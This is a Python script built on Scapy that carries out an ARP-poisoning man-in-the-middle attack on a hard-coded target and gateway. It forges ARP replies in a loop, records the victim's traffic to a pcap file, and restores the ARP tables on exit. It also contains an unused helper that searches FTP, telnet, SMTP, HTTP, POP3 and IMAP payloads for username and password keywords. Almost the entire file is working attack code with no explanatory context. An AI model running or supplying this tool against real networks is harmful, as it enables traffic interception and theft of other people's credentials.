#!/usr/bin/python3
import sys
import signal
import threading
from scapy.all import *

interface = "eth0"
target_ip = "192.168.0.250"
gateway_ip = "192.168.1.1"


def packet_callback_example(packet):
    keywords = ("user", "name", "login", "pass", "password")
    td_filter = ("tcp port 20"                                       # ftp
                 " or tcp port 23"                                   # telnet
                 " or tcp port 25"                                   # smtp
                 " or tcp port 80"                                   # http
                 " or tcp port 110"                                  # pop3
                 " or tcp port 143")                                 # imap

    data = str(packet[TCP].payload)
    if any(k in data.lower() for k in keywords):
        print("[*] Server: {}".format(packet[IP].dst))
        print("[*] {}".format(packet[TCP].payload))


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)


def get_mac(ip_addr):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_addr),
                                timeout=2, retry=10)
    for s, r in responses:
        return r[Ether].src
    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")
    while True:
        send(poison_target)
        send(poison_gateway)
        time.sleep(2)


def main():
    conf.iface = interface
    conf.verb = 0
    print("[*] Setting up {}".format(interface))

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print("[!] Failed to get gateway MAC. Exiting")
        sys.exit(0)
    else:
        print("[*] Gateway {} is at {}".format(gateway_ip, gateway_mac))

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print("[!] Failed to get target MAC. Exiting")
        sys.exit(0)
    else:
        print("[*] Target {} is at {}".format(target_ip, target_mac))

    poison_thread = threading.Thread(
        target=poison_target,
        args=(gateway_ip, gateway_mac, target_ip, target_mac)
    )
    poison_thread.daemon = True
    poison_thread.start()

    try:
        print("[*] Starting sniffer")
        sniff(filter="ip host {}".format(target_ip),
              prn=lambda packet: wrpcap('arper.pcap', packet, append=True),
              iface=interface, store=0)
        signal.pause()
    except (KeyboardInterrupt, SystemExit):
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[*] ARP poison attack finished.")
        sys.exit(0)


if __name__ == "__main__":
    main()
